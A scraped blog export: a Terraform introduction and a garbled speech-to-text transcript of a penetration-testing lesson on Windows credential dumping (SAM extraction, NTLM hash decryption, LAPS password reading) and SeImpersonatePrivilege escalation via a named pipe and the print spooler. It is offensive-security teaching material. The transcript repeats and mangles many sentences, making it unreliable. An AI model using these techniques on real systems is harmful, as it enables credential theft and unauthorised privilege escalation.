docker-cli\nchoco install -y openvpn\nchoco install -y ruby\nchoco install -y golang\nchoco install -y powergui\nchoco install -y conemu\nchoco install -y powershell\nchoco install -y powershell-core\nchoco install -y sublimetext3.app\nchoco install -y wsl\nchoco install -y wsl-alpine\nchoco install -y wsl-debiangnulinux\nchoco install -y wsl-ubuntu-1804\nchoco install -y wsl-kalilinux\n```"},{"fields":{"slug":"/introduction-to-terraform"},"excerpt":null,"frontmatter":{"date":"18th June 2021 ","title":"Introduction to Terraform","description":"","tags":"terraform","posttype":"tutorial"},"body":"# Introduction\n\n\t• Started 2014\n\t• Terraform is the infrastructure as code offering from HashiCorp. \n\t• Single declarative language instead of configuration through various dashboards.\n\t• HCL - HashiCorp Configuration Language (HCL) \n\t• HitashiCorp makes Vagrant, Packer, Vault, Consul, Nomad\n\t• Two versions, Cloud (Open Source) and Enterprise (Paid For)\n\t• Enterprise has better auditing and more templates. \n\t• Can run, Amazon AWS, Azure, Google Cloud, Oracle, Alibaba Cloud\n\t• IT is commonly misunderstood that you can run a file against multi clouds verbatim i.e. without any modifications. \n\n# Advantages\n\n\t• Easily repeatable\n\t• Easily readable\n\t• Operational certainty with \"terraform plan\"\n\t• Standardised environment builds\n\t• Quickly provisioned development environments\n\t• Disaster recovery\n\n# Complimentary  Technologies\n\n\t• Ansible\n\t• Chef\n\t• Puppet\n\t• SaltStack\n\t• Packer = You create a stack (like a container) that you deploy to a server. Docker changes the server (you run it on the server)\n\t• Docker = Containers\n\t• Kubernetes = Open Source Docker Container Manager\n\t• Nomad = HashiCorp version of Kubernetes (provisions containers)\n\n# HCL Files\n\n\t• Split into two (Provider and Resource)\n\t• The provider block configures the named provider such as AWS, Azure, \n\t• The resource block defines a piece of infrastructure. A resource might be a physical component such as an EC2 instance, or it can be a logical resource such as a Heroku application.\n\n## Provider\n\nGo to terraform.io to see the list of providers. \n\nCurrent List\n\n\t• ACME\n\t• Akamai\n\t• Alibaba Cloud\n\t• Archive\n\t• Arukas\n\t• Auth0\n\t• Avi Vantage\n\t• Aviatrix\n\t• AWS\n\t• Azure\n\t• Azure Active Directory\n\t• Azure Stack\n\t• A10 Networks\n\t• BaiduCloud\n\t• Bitbucket\n\t• Brightbox\n\t• CenturyLinkCloud\n\t• Check Point\n\t• Chef\n\t• CherryServers\n\t• Circonus\n\t• Cisco ASA\n\t• Cisco ACI\n\t• Cloudflare\n\t• Cloud-init\n\t• CloudScale.ch\n\t• CloudStack\n\t• Cobbler\n\t• Cohesity\n\t• Constellix\n\t• Consul\n\t• Datadog\n\t• DigitalOcean\n\t• DNS\n\t• DNSimple\n\t• DNSMadeEasy\n\t• Docker\n\t• Dome9\n\t• Dyn\n\t• EnterpriseCloud\n\t• Exoscale\n\t• External\n\t• F5 BIG-IP\n\t• Fastly\n\t• FlexibleEngine\n\t• FortiOS\n\t• Genymotion\n\t• GitHub\n\t• GitLab\n\t• Google Cloud Platform\n\t• Grafana\n\t• Gridscale\n\t• Hedvig\n\t• Helm\n\t• Heroku\n\t• Hetzner Cloud\n\t• HTTP\n\t• HuaweiCloud\n\t• HuaweiCloudStack\n\t• Icinga2\n\t• Ignition\n\t• Incapsula\n\t• InfluxDB\n\t• Infoblox\n\t• JDCloud\n\t• KingsoftCloud\n\t• Kubernetes\n\t• Lacework\n\t• LaunchDarkly\n\t• Librato\n\t• Linode\n\t• Local\n\t• Logentries\n\t• LogicMonitor\n\t• Mailgun\n\t• MetalCloud\n\t• MongoDB Atlas\n\t• MySQL\n\t• Naver Cloud\n\t• Netlify\n\t• New Relic\n\t• Nomad\n\t• NS1\n\t• Null\n\t• Nutanix\n\t• 1&1\n\t• Okta\n\t• Okta Advanced Server Access\n\t• OpenNebula\n\t• OpenStack\n\t• OpenTelekomCloud\n\t• OpsGenie\n\t• Oracle Cloud Infrastructure\n\t• Oracle Cloud Platform\n\t• Oracle Public Cloud\n\t• OVH\n\t• Packet\n\t• PagerDuty\n\t• Palo Alto Networks\n\t• PostgreSQL\n\t• PowerDNS\n\t• ProfitBricks\n\t• Pureport\n\t• RabbitMQ\n\t• Rancher\n\t• Rancher2\n\t• Random\n\t• RightScale\n\t• Rubrik\n\t• Rundeck\n\t• RunScope\n\t• Scaleway\n\t• Selectel\n\t• SignalFx\n\t• Skytap\n\t• SoftLayer\n\t• Spotinst\n\t• StackPath\n\t• StatusCake\n\t• Sumo Logic\n\t• TelefonicaOpenCloud\n\t• Template\n\t• TencentCloud\n\t• Terraform\n\t• Terraform Cloud\n\t• Time\n\t• TLS\n\t• Triton\n\t• Turbot\n\t• UCloud\n\t• UltraDNS\n\t• Vault\n\t• Venafi\n\t• VMware Cloud\n\t• VMware NSX-T\n\t• VMware vCloud Director\n\t• VMware vRA7\n\t• VMware vSphere\n\t• Vultr\n\t• Wavefront\n\t• Yandex\n\n# Declarative vs Procedural \n\nTerraform is a declarative type language.\n\n## Declarative \n\nDefine how the end-state should look \n\nThere shall be a load balancer in front  of a pool of 3 servers \n\n## Procedural \n\nPerform set of actions to create an end state\n\n# Installing Terraform\n\nhttps://www.terraform.io/downloads.html\n\nWe can use Homebrew or Chocolatey on Windows to install Terraform. Alternatively, we can perform a manual installation with a binary package. \n\n## Chocolatey\n\nRun the following after installing Chocolatey\n```\nchoco install terraform\nterraform --help\n```\n\nExample Output\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n    <img src=\"/static/bdb26b17-4f49-413c-9f22-7cb1bf30631c.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\"Installing Terraform with Chocolately \"><figcaption class=\"figure-caption text-center fw-normal text-dark\">  </figcaption></figure>\n\n## Manual\n\nFor manual installation, you need to download the binary and add the location to your system path. \n\n# Building Infrastructure\n\n\t• The set of files used to deploy your infrastructure is called a 'configuration' \n\nThe prerequisite to run the below is an AWS Account and the AWS CLI installed. \n\n```\nmkdir learn-terraform-aws-instance\ncd learn-terraform-aws-instance\n```\n\nnano example.tf\n```\n\t\tprovider \"aws\" {\n\t\t  profile = \"default\"\n\t\t  region  = \"us-east-1\"\n\t\t}\n\t\t\n\t\tresource \"aws_instance\" \"example\" {\n\t\t  ami           = \"ami-2757f631\"\n\t\t  instance_type = \"t2.micro\"\n\t\t}\n```\n\n\n```\nterraform init\nterraform apply\n```\n\nAt this point, you will be prompted as below\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n    <img src=\"/static/f0248486-4143-4e96-9ff9-fb675ddd738b.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\"Confirm Your Terraform Plan\">\n    <figcaption class=\"figure-caption text-center fw-normal text-dark\">Confirm Your Terraform Plan</figcaption>\n</figure>\n\nAt this point you can cancel out and it will have no effect, alternatively you can proceed.  Terraform will create your infrastructure. \n\nYou can run the following to see your infrastructure. \n```\nterraform show \n```\n\nWhen you have finished you may run the following to tear down the infrastructure.\n```\nterraform destroy\n```\n\n# Coding\n\n\t• Visual Studio Code, IntelliJ, Eclipse, all have support for terraform.\n\t• Lists are the same as arrays in Php or Dictionary in Python\n\t• Sets are like Tuples in Python. \n\nWe can set variables\n```\nvariable \"location\" {\n  description = \"Name of the Azure region to create resources in\"\n  default     = \"westus2\"\n  type        = string\n}\n```\n\nWe can use variables\n```\nresource \"azurerm_resource_group\" \"rg\" {\n  name     = \"tf-variables-rg\"\n  location = var.location\n}\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n    <img src=\"/static/186e96d6-60f7-4f38-a355-3f010411687e.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\"Setting Variables \">\n    <figcaption class=\"figure-caption text-center fw-normal text-dark\">Setting Variables</figcaption></figure>\n\nCross References\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n    <img src=\"/static/20216f1f-5ede-4823-b932-e604cbb827f4.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\"Setting Cross References \">\n    <figcaption class=\"figure-caption text-center fw-normal text-dark\">Setting Cross References</figcaption>\n</figure>\n\n\n# Changing Configuration\n\nAs you change Terraform configurations, Terraform builds an execution plan that only modifies what is necessary to reach your desired state.\n\n# Resources\n\nRepo from Cybrary Trainer\nhttps://github.com/jleonelion/fundamentals-of-terraform \n\nTerraform Releases\nhttps://releases.hashicorp.com/terraform/"},{"fields":{"slug":"/credential-dumping"},"excerpt":"Sam database local Windows credentials are stored in the security account manager or Sam database as password hashes using the nclm hashing…","frontmatter":{"date":"17th June 2021 ","title":"Credential Dumping","description":"","tags":null,"posttype":"article"},"body":"Sam database\n local Windows credentials are stored in the security account manager or Sam database as password hashes using the nclm hashing format which is based on the MD for algorithm we can reuse acquired nclm hashes to authenticate to a different machine as long as the hash is tied to a user account and password registered on that machine although it's rare to find matching local credentials between disparate machines the built-in default named administrator account is installed on all windows based machines this account has been disabled on desktop editions since Windows Vista but it is enabled on servers by default\n to ease administrative task system administrators often enable this default account on desktop editions and set a single shared password given the capability of this attack Vector let's walk through an example\n in this case will attack the default local administrator account\n every Windows account has a unique security identifier or SID that follows a specific pattern\n in this structure the seed begins with a literal ass to identify the string is a sid followed by a revision level usually set to 1 and identify Authority value often five and one or more sub of 30 values the sub Authority will always end with a relative identifier or or Friday representing a specific object on the machine\n let's use Powershell nwmi to locate the seed of the local administrator account on our Windows 10 victim machine\n let's use Powershell and wmi to locate the seed of the local administrator account on our Windows 10 victim machine\n first we'll determine the local computer name from the associated environment variable\n and use it with the wmi win32 user account class\n to obtain results for the local administrator account will specify the computer name through the domain property\n and the account name through the name property\n the output reveals in r i d value of 500 as expected\n next will attempt to obtain credentials for this user account from the Sam database\n the Sam database is located at C Windows system32 config Sam but the system process has an exclusive lock on it\n preventing us from reading or copying it even from an administrative command prompt\n there are two potential workarounds\n first we could use the volume Shadow copy server which can create a snapshot or Shadow volume of the local hard drive with vssadmin which is installed on Windows 8.1 and later we can create a new Shadow volume with the create Shadow option but this option is only available on server editions of the school the second approach which will work on our Windows 10 machine is to execute this option through wmic launched from an administrative command prompt specifically it will launch wmic specify the shadow copy class\n create a new Shadow volume and specify the source drive with volume equals\n this will create a snapshot of the C drive\n to verify this will run vssadmin and list the existing Shadow volumes with list Shadows\n now that we've confirmed the creation of the Shadow volume we can copy the Sam database from it using the source path provided in the output\n although we have copied the Sam database it is partially encrypted by either rc4 or AES\n the encryption keys are stored in the system file which is in the same folder as the Sam database however it is also locked by the system account\n we can reuse our shadow volume copy to copy this file as well\n we can also obtain a copy of the Sam database and system files from the registry in the H key local machine Sam and hkey local machine system hives respectively administrative permissions are required to read and copy\n for example will use the reg save command to save the content to the hard disk by specifying the registry hive\n and the output file name and path\n regardless of how we obtained the Sam database and system file we must decrypt them\n at the time of this video the only two tools that can decrypt these files are Mimi cats and credit dump 7 in this example will use credit dump first will install the python crypto library and then clone cred dumped from the GitHub repository with Git clone\n at the time of this video the only two tools that can decrypt these files are Mimi cats and credit seven in this example will use credum first will install the python crypto library and then clone cred dumped from the GitHub repository with Git clone\n next will copy the Sam and system files from the Windows 10 victim machine to our Kali Linux machine\n and use the PW dump python script from Craig dump 7 to decrypt the ntlm hashes\n we have successfully decrypted the Sam database and obtain the ntlm password hash for the local administrator account\n in this section we have executed this process manually to demonstrate the individual steps however many post exploitation Frameworks can automate this process as well\n in the next section will examine how Microsoft has attempted to mitigate the risk of this attack vector\nhardening the local administrator account\n although disabling this account would block this attack Vector many organizations rely on this account for various applications and administrative tasks in an attempt to prevent attacks that leverage shared administrator passwords Microsoft introduced Group Policy preferences with Windows Server 2008 which included the ability to centrally change local administrator account passwords however this approach stored data in an XML file in a cyst fall folder which must be accessible to all computers in active directory\n this created an obvious security issue since the unhash local administrator password was stored on an easily accessible share to solve this issue Microsoft aes-256 and Cryptid them the aes-256 encryption password is realistically unbreakable given a strong key\n this created an obvious security issue since the unhash the local administrator password was stored on an easily accessible share to solve this issue Microsoft aes-256 and Cryptid them the aes-256 encryption password is realistically unbreakable given a strong key\n surprisingly Microsoft published the AES private key on msdn effectively breaking their own encryption\n as an apparent solution Microsoft issued a security update in 2014 which removed the ability to create group policy preferences containing passwords although these files could no longer be created existing Group Policy preferences containing passwords were not removed meaning some may still exist in the wild to again address the issue of centrally managing passwords for the local administrator account Microsoft released the local administrator password solution or laps in 2015 which offered a secure and scalable way of remotely managing the local administrator password for domain-joined computers laps introduces two new attributes for the computer object into active directory the first registers the expiration time of a password as directed through a group policy\n the second contains the cleartext password of the local administrator account\n this attribute is confidential meaning specific read permissions are required to access the content which is normally assigned through group membership lapse uses the unmanaged dynamic link library admp wdll to change the local administrator password and push the new password to the second attribute of the associated computer object\n if lapses in use we should try to gain access to the clear text passwords in active directory as part of a penetration test\n is lapses in use we should try to gain access to the clear text passwords in active directory as part of a penetration test\n while Microsoft has released a Powershell toolkit to query lapse it is not typically installed on a workstation\n while Microsoft has released a Powershell toolkit to query lapse it is not typically installed on a Workstation\n instead we can use the laps toolkit Powershell script which is essentially a rapper script around the Power view active directory enumeration Powershell script\n for example will invoke the get laps computers method from laps toolkit to list all computers which are set up with laps and display the hostname the clear text password and the expiration time\n although we have discovered the app serves 01 server which is managed by elapsed we cannot view the clear text password\n in this case our current user account does not have permissions to read the password so it's returned as empty we can use the find laps delegated groups method of laps toolkit to discover groups that can fully enumerate the lapse data\n from the output we find that members of the custom laps password readers group have read permissions\n next week and use powerview to enumerate members of that group through the get net group member method\n supplying the group name option to specify the group name\n the output reveals that the Jeff and admin users can read the laps passwords\n these permissions are often given to both help desk employees and system administrators users with these permissions are prime targets during a penetration test since they have access to clear text passwords on a potentially large number of workstations or servers\n for example we start a Powershell instance as the admin user\n and view the laps passwords with get laps computers\n we can use the local administrator password for App serves your one to remotely log into this machine and others with matching credentials\n now that we have an understanding of the local administrator account and potential attack vectors against it let's investigate how access rights and permissions work after a user has authenticated on Windows\naccess tokens\n credentials such as username and password combinations are used for authentication but the operating system also must keep track of the users access rights for example authorization Windows users access tokens to track these rights and their assigned to each process associated with the user in this section will discuss access tokens and explore various ways we can leverage them for privilege escalation\n credentials such as username and password combinations are used for authentication with the operating system also must keep track of the users access rights for example authorization Windows users access tokens to track these rights and their assigned to each process associated with the user in this section will discuss access tokens and explore various ways we can leverage them for privilege escalation\naccess token Theory\n an access token is created by the colonel upon user authentication and contains important values that are linked to a specific user through the Sid access tokens are stored inside the kernel which prevents us from directly interacting with the token or modifying it as penetration testers will focus on two concepts relating to the access token specifically Integrity levels and privileges Windows defines for integrity levels which determine the level of access low medium high and system\n low Integrity is used with sandbox processes like web browsers applications executing in the context of a regular user run at medium integrity and administrators can execute applications at high integrity system is typically only used for system Services it's not possible for a process of a certain Integrity level to modify a process of hire Integrity level but the opposite is possible this is done to prevent trivial privilege escalation local administrators received to access tokens when authentication the first which is used by default is configured to create processes as medium Integrity when the user selects the run as administrator option for an application II elevated token is used instead and allows the process to run at high integrity\n the user account control or UAC mechanism links these two tokens to a single user and creates the consent prompt a local administrator regulated by UAC is sometimes also called a split token administrator privileges are also included in the access token they are a set of predefined operating system access rights that govern which actions of process can perform within the access token privileges are controlled by two-bit masks the first sets the Privileges which are present for that specific token and cannot be modified through any apis inside the same logon session II registers if the present privileges are enabled or disabled and may be dynamically updated through the win32 API adjust token privileges\n for example we can easily view the available privileges for the current user with who am I from command. Exe by specifying the / flag the output shows five privileges although we won't discuss every privilege let's discuss token privilege modification the SEC shut down privilege privilege allows the user to reboot or shut down the computer since it is listed in the output it is present in the access token but it is also disabled if we choose to shut down the computer through the shutdown command the backend code will enable the privilege with adjust token privileges\n for example we can easily view the available privileges for the current user with who am I from command. Exe by specifying the / flag the output shows five privileges although we won't discuss every privilege let's discuss token privilege modification the SE shutdown privilege privilege allows the user to reboot or shut down the computer since it is listed in the output it is present in the access token but it is also disabled if we choose to shut down the computer through the shutdown command the backend code will enable the privilege with adjust token privileges\n and then perform the required actions to power off the operating system while it is impossible to modify the set of privileges that are associated with an active log on session it is however possible to add additional privileges that will take effect after the targeted user account logs out and log back in programmatically this can be done with the win32 API LSA add account rights but more often it would be performed through a group policy or locally through an application like secpol. MSC\n and then perform the required actions to power off the operating system while it is impossible to modify the set of privileges that are associated with an active log on session it is however possible to add additional privileges that will take effect after the targeted user account logs out and log back in programmatically this can be done with the win32 API LSA add account rights but more often it would be performed through a group policy or locally through an application like SEC Paul. MSC\n selected privilege SE load driver privilege yields the permission to load a kernel driver if we were to apply that privilege to our user the current token would not be modified rather a new token would be created once the user logs out and back in again\n as we wrap up this theoretical section we must discuss two types of access tokens each process has a primary access token which originates from the user's token created during authentication in addition and impersonation token can be created which allows a user to act on behalf of another user without that users credential impersonation tokens have four levels Anonymous identification impersonation and delegation\n as we wrap up this theoretical section we must discuss two types of access tokens each process has a primary access token which originates from the user's token created during authentication in addition and impersonation token can be created which allows a user to act on behalf of another user without that users credentials impersonation tokens have four levels Anonymous identification impersonation and delegation\n Anonymous an identification only allow enumeration of information impersonation as the name implies allows impersonation of the client's identity while delegation makes it possible to perform sequential Access Control checks across multiple machines the ladder is critical to the functionality of distributed applications for example let's assume a user authenticate to a web server and performs an action on that server that requires a database look up the web server could use delegation to pass authentication to the database server through the web server now that we've discussed the main theory behind Windows post off an occasion permissions and access rights will practically apply this theory in the next section\nelevation with impersonation\n in the previous section we discussed how the Privileges of an access token decide the access rights of an authenticated user\n now let's discuss how we can leverage certain privileges for escalation in the past security researchers have identified nine different privileges that may allow for privilege escalation from medium Integrity to either high integrity or system Integrity or enable compromise of processes running as another authenticated user explaining all 9 privileges in depth and how they may be used to escalate privileges is beyond the scope of this module but will focus on SE impersonate privilege this privilege allows us to impersonate any token for which we can get a reference or handle SE in person a privilege is quite interesting since the built-in network service account the local service account and the default is account\n now let's discuss how we can leverage certain privileges for escalation in the past security researchers have identified nine different privileges that may allow for privilege escalation from medium Integrity to either high integrity or system Integrity for an able compromise of processes running as another authenticated user explaining all 9 privileges in depth and how they may be used to escalate privileges is beyond the scope of this module but will focus on SE impersonate privilege this privilege allows us to impersonate any token for which we can get a reference or handle SE in person a privilege is quite interesting since the built-in network service account the local service account and the default is account\n assigned by default because of this gaining code execution on a web server will often give us access to this privilege and potentially offer the possibility to escalate our access if we have SE in-person a privilege we can often use the duplicate token X win32api to create a primary token from an impersonation token and create a new process in the context of the impersonated user when no tokens related to other user accounts are available in memory we can likely Force the system account to give us a token which we can impersonate to leverage as the impersonate privilege in this section we're going to use a post exploitation attack that relies on Windows pipes pipes are a means of inner process communication just like our PC cam or even network sockets\n I've been assigned by default because of this gaining code execution on a web server will often give us access to this privilege and potentially offer the possibility to escalate our access if we have SE impersonate privilege we can often use the duplicate token X win32api to create a primary token from an impersonation token and create a new process in the context of the impersonated user when no tokens related to other user accounts are available in memory we can likely Force the system account to give us a token which we can impersonate to leverage as the impersonate privilege in this section we're going to use a post exploitation attack that relies on Windows pipes pipes are a means of inner process communication just like our PC cam or even network sockets\n a pipe is a section of shared-memory inside the colonel that processes can use for communication one process the pipe server can create a pipe while other processes pipe clients can connect to the pipe and read or write information from or to it depending on the configured access rights for a given height Anonymous pipes are typically used for communication between parent and child processes while named pipes are more broadly used in our example will make use of named pipes because they have more functionality and more importantly they support impersonation the attack that we're going to stimulate based on a technique developed by security researcher Lee Christensen can force the system account to connect to a named pipe set up by an attacker\n a pipe is a section of shared-memory inside the colonel that processes can use for communication one process the pipe server can create a pipe while other processes pipe clients can connect to the pipe and read or write information from or to it depending on the configured access rights for a given height Anonymous pipes are typically used for communication between parent and child processes while named pipes are more broadly used in our example will make use of named pipes because they have more functionality and more importantly they support impersonation the attack that we're going to stimulate based on a technique developed by security researcher Lee Christensen can force the system account to connect to a named pipe setup by an attacker\n while the technique was originally developed as part of an active directory attack it can also be used locally it's based on The Print Spooler service which is started by default and run in a system context will discuss the technique in more detail later for now it's important to understand that the attack is based on the fact that the Print Spooler monitors printer object changes and sends change notifications to print clients by connecting to their respective named pipes if we can create a process running with the SE impersonate privilege that simulates a print client we will obtain a system token that we can impersonate to demonstrate this let's create a C sharp application that creates a pipe server weights for a connection and attempts to impersonate the client that connects to it\n the first key component of this attack is the impersonate named pipe client API which allows impersonation of the token from the account that connects to the pipe if the server has se impersonate privilege when impersonate named pipe client is called the calling thread will use the impersonated token instead of its default token in order to create our first proof-of-concept will have to use the create named pipe connect named pipe and impersonate named pipe client 32 apis\n as the name suggests create named pipe creates a pipe is API except the number of relatively simple arguments the first and most important is the pipe name all named pipes must have a standardized name format and must be unique on the system the second argument describes the mode the pipe is opened in\n will specify a bi-directional pipe with the pipe access duplex enum using its numerical equivalent of 3 the third argument describes the mode the pipe operates in will specify pipe type bite to directly write and read bites along with pipe wait to enable blocking mode\n this will allow us to listen on the pipe until it receives a connection will specify the combination of these two modes with the numerical value zero the maximum number of instances for the pipe is specified through nmax instances this is primarily used to ensure efficiency and larger applications and any value between 1 and 2:55 works for us in out buffer size and an in buffer size Define the number of bikes to use for the input and output buffer respectively will choose one memory page of hacks 1,000 bytes the second to last argument defines the default timeout value that is used with the weight named pipe API\n since we're using a blocking named pipe we don't care about this and we can choose the default value of 0 for the last argument we must submit a sid detailing which clients can interact with the pipe will set this to know to allow the system and local administrators to access it\n at this point will create a new Visual Studio solution\n and insert the P invoke dllimport statement along with the call to create named pipe\n and insert the p in Boca dllimport statement along with the call to create named pipe\n this code expects the pipe name to be passed on the command line\n next we must invoke connect named pipe the first argument is a handle to the pipe which is returned by create named pipe and the second is a pointer to a structure used in more advanced cases in our case will simply set this to know\n next we add the code required to import and call connect named pipe\n after we've called connect named pipe the application will wait for an incoming pipe client\n once the connection is made will call impersonate named pipe client to impersonate the client impersonate named pipe client accept the pipe handle as it's only argument or its function prototype\n once the connection is made will call impersonate named pipe client to impersonate the client impersonate named pipe client accepts the pipe handle as it's only argument or its function prototype\n the rather simple code editions importing and calling impersonate named pipe client are added next\n at this point our code will start a pipe server listen for incoming connections and impersonate them if everything works correctly impersonate named pipe client will assign the impersonated token to the current thread but we have no way of confirming this in our current application to verify the success of our attack we can open the impersonated token with open thread token and then use get token information to obtain the Sid associated with the token finally we can call convert Sid to string Sid to convert the Sid to a readable Sid string while this confirmation does not have to be part of our final exploit it helps us understand the attack let's add these apis to Arco let's examine the function prototype for open thread token\n according to the function prototype we must First Supply a handle to the thread associated with this token\n since the thread in question is the current thread will use the get current thread win32api which does not require any arguments and simply Returns the handle next we must specify the level of access we went to the Token to avoid any issues will ask for all permissions with its numerical value\n since the threat in question is the current thread will use the get current thread win32api which does not require any arguments and simply Returns the handle next we must specify the level of access we went to the Token to avoid any issues will ask for all permissions with its numerical value\n open a self specifies whether the API should use the security context of the process or the thread since we want to use the impersonated token will set this to false finally we must Supply a pointer that will be populated with a handle to the Token that is opened\n open a self specifies whether the API should use the security context of the process or the thread since we want to use the impersonated token will set this to fall so finally we must Supply a pointer that will be populated with a handle to the Token that is opened\n let's add the required code\n next will invoke get token information\n the API can return a variety of information but will simply request this Sid the first argument is the token we obtained from open thread token and the second argument specifies the type of information we want to obtain token information class isn't enough that contains value specifying the type of information we can retrieve from an access token via get token information since we simply want the CID we can pass token user which has the numerical value of one for the token information class argument token information is a pointer to the output buffer that will be populated by the API\n the API can return a variety of information but we'll simply request this Sid the first argument is the token we obtained from open thread token and the second argument specifies the type of information we want to obtain token information class isn't enough that contains value specifying the type of information we can retrieve from an access token via get token information since we simply want the CID we can pass token user which has the numerical value of one for the token information class argument token information is a pointer to the output buffer that will be populated by the API\n and token information length is the size of the output buffer since we don't know the required size of the buffer the recommended way of using the API is to call it twice the first time we set these two argument values to know and 0 respectively and then return length will be populated with the required size\n after this we can allocate an appropriate buffer and call the API a second time\n to allocate the token information buffer will use the dotnet Marshall Alec H Global method which can allocate unmanaged memory\n as the final step will use convert Sid to string CID to convert the binary CID to a CID string which we can read the first argument is a pointer to the Sid the Sid is in the output buffer that was populated by get token information but we must extract it first one way to do this is to define the token user structure which is part of the token information class used by get token information and then Marshall a pointer to it with Marshall pointer to structure for the last argument will supply the output string here we can simply Supply in empty pointer and once it gets populated Marshall it to see Sharp string with Marshall pointer to string Auto\n as the final step will use convert Sid to string Sid to convert the binary Sid to a CID string which we can read the first argument is a pointer to the Sid the Sid is in the output buffer that was populated by get token information but we must extract it first one way to do this is to define the token user structure which is part of the token information class used by get token information and then Marshall a pointer to it with Marshall pointer to structure for the last argument will supply the output string here we can simply Supply in empty pointer and once it gets populated Marshall it to see Sharp string with Marshall pointer to string Auto\n let's add the required structures\n import\n and code\n on the last line of code we print the CID associated with the token to the console showing which user we impersonated now we have finally written all the code we need to test and better understand the use of named pipes for impersonation and privilege escalation\n on the last line of code we print the sea associated with the token to the console showing which user we impersonated now we have finally written all the code we need to test and better understand the use of named pipes for impersonation and privilege escalation\n as previously mentioned we must execute the code in the context of a user account that has the SE impersonate privilege access right\n for our attack demonstration will log into app server 01 as the domain user admin\n for our attack demonstration will log into app serves 01 as the domain user admin\n and use PS exact to open a command prompt as the built-in network service account\n before we execute our application we can verify the user and the presence of SE impersonate privilege in the new command prompt\n now we can transfer it to app serves 01\n next we executed and Supply a random pipe name\n simulator connection we can open an elevated command prompt and write to the pipe\n when we switch back to the command prompt running our application\n we find that a CID has been printed our code has impersonated a token and resolved the associated Sid to verify that this Sid belongs to the administrator account we can switch back to the elevated command prompt and dump it\n this proves that we have indeed impersonated the built-in domain administrator account more importantly we can impersonate anyone who connects two are named pipe\n it's now time to test her application leveraging The Print Spooler service communication to the spooler service is done through print system remote protocol which dates back to 2007 and is not well documented fortunately for us the MSRP RN Works through named pipes the potential for abuse comes from the RPC open printer and our PC remote find first printer change notification functions\n our PC open printer allows us to retrieve a handle for the printer server which is used as an argument to the second API\n our PC remote find first printer change notification essentially monitors printer object changes and sends change notifications to print clients\n once again this change notification requires the principal or to access the print client if we ensure that the print client is are named pipe it will obtain a system token that we can impersonate sadly unlike regular win32api MSRP RN apis cannot be called directly principal or functionality resides in an unmanaged library and is called through a proxy function\n once again this change notification requires the principal or to access the print client if we ensure that the print client is are named pipe it will obtain a system token that we can impersonate sadly unlike regular win32api MSRP RN apis cannot be called directly principal or functionality resides in an unmanaged the library and is called through a proxy function\n that uses a binary format to pass and invoke underlying functions\n the implementation of these calls are beyond the scope of this module luckily we can use the spool sample C sharp implementation written by Lee Christensen or the Powershell code written by Vincent Le 2\n when we use School sample we must specify the name of the server to connect to and the name of the server we control also called the capture server\n since we're performing the attack locally both servers are the same\n this presents a challenge The Print Spooler service running as system on the victim needs to contact the simulated print client through our pipe but since they're on the same hoes they in effect required the same pipe name because of this we cannot create the name pipe with the required name in order to find a solution we first must understand the problem in detail to do this we'll monitor the target system with sysinternals process monitor while executing spool sample. Exe against an arbitrary hype name\n first will configure capture filter with filter filter and select process name from the drop-down menu setting this to spool serve. Exe will then click add followed by a plaid and exit the filter menu by selecting okay\n then we'll execute spool sample and specify the current host name followed by an arbitrary named pipe\n although the application output indicates that a printer notification callback was configured process monitor shows that no access to the arbitrary pipe name has occurred the reason for this is that before attempting to access the client pipe The Print Spooler service validates the pipe path making sure it matches the default name\n our arbitrary pipe test fails this validation and consequently The Print Spooler service doesn't even attempt to connect to the client this is why we don't see any connections in process monitor unfortunately as mentioned before we cannot specify spool SS as a name since it's already in use by The Print Spooler service we're targeting\n at this point it's useful to know what happens when a file path is supplied to a win32api when directory separators are used as part of the file path they are converted to canonical form specifically forward slash has will be converted to backwards lashes this is also known as file path normalization interesting Lee enough a security researcher discovered that if we provide spool sample with an arbitrary pipe name containing a forward slash after the host name\n the spooler service will not interpret it correctly and it will depend the default name to our own path before processing it this effectively bypasses the path validation and the resulting path is then normalized before the spooler service attempts to send a print object change notification message to the client\n this can obviously help us because the pipe name differs from the default name used by The Print Spooler service and we can register it to stimulate a print client\n to verify this we can repeat our last example this time supplying an arbitrary pipe name that contains a forward slash in the print client name\n we receive an error\n and process monitor confirms the theory first the path we supplied has been switched to a canonical form as part of the full path II spool serve. Exe attempted to access the named pipe\n since we have not created a pipe server by that name the request failed at this point we just need to create a pipe server with that name and simulate a print client when we execute spool sample The Print Spooler service will connect to our pipe\n did you this will open another command prompt as network service because we're demonstrating a scenario where we've exploded a process that has the SE in person a privilege and we're trying to escalate to system\n and launch our application\n now will invoke spool sample to trigger the change notification against the capture server\n our application reveals a connection from the S15 18 CID\n or application reveals a connection from the S15 18 CID\n this Sid value belongs to the system account proving that our technique worked excellent we now have a way of forcing the system account to authenticate to our named pipe which allows us to impersonate it\n this Sid value belongs to the system account proving that our technique worked excellent we now have a way of forcing the system account to authenticate to our names pipe which allows us to impersonate it\n you complete this attack we must now take advantage of the impersonated token which we will do by first launching a command prompt as system\n the win32 create process with token wapi can create a new process based on a token\n the token must be a primary token so will first use duplicate token X to convert the impersonation token to a primary token first will supply the impersonation token by recovering it with open thread token will request full access to the token with the numerical value hex f01 ff4 the d w desired access argument for the third argument will use a default security descriptor for the new token by setting this to know\n impersonation level must be set to security impersonation which is the access type we currently have to the Token this has a numerical value of 2 for the token type will specify a primary token by setting this to won the final argument is a pointer that will be populated with the handle to the duplicated token\n what's a token duplicated as a primary token we can call create process with token to create a command prompt as system\n with the token duplicated as a primary token we can call create process with token to create a command prompt as system\n first we'll Supply the newly duplicated token followed by a log on option which we set to its default of 0 for the third and fourth arguments will supply and the full path of cmd.exe respectively\n the creation Flags environment block and current directory arguments can be set to 0 no and no respectively to select the default option for the last two arguments we must pass start up info and process information structures which are populated by the API during execution\n the creation Flags environment block and Corinth directory arguments can be set to 0 no and no respectively to select the default option for the last two arguments we must pass start up info and process information structures which are populated by the API during execution\n neither of these are defined in p and VOC Imports so we must Define them ourselves as shown in the following code\n with all the code written will compile it\n and transfer it to the Windows Server 2019 machine\n will execute this just as before my first a launching or application in the context of the network service to create the pipe server on app serves 